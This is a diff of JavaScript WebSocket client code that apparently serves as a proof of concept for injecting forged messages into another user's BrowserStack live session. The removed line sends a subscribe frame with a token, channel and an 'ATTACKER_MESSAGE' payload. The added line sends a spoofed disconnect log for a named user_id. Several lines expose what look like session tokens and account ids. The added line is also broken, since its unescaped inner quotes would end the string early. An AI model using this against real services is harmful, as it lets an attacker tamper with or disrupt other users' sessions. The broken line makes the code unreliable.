@@ -14,7 +14,7 @@
 
     ws.onopen = function() {
         console.log('WebSocket connection opened');
-        ws.send("42[\"subscribe\",\"{\"token\":\"hd8qffsjbht765ff\",\"channel\":\"bs_live_session_7894948\",\"service\":\"https://pusher-live.browserstack.com\",\"type\":\"live_dashboard\",\"channels\":[\"live_global_channel\"],\"prefix\":\"\",\"reconnects\":0,\"is_bridge_cloud_user\":false,\"user_group_id\":\"7790756\",\"message\":\"This is ATTACKER_MESSAGE\",\"userAgent\":\"Gecko/20100101 Firefox/119.0\"}]"); 
+        ws.send("42["message",{"sender":"client:","message":"{\"type\":\"disconnect\",\"time\":\"2023-11-10T07:04:47.202Z\"}","channel":"uD31C4UhQdFK8R8Z64do","type":"log","user_id":"7739310","live_session_id":""}]"); 
     };
 
     ws.onmessage = function(event) {
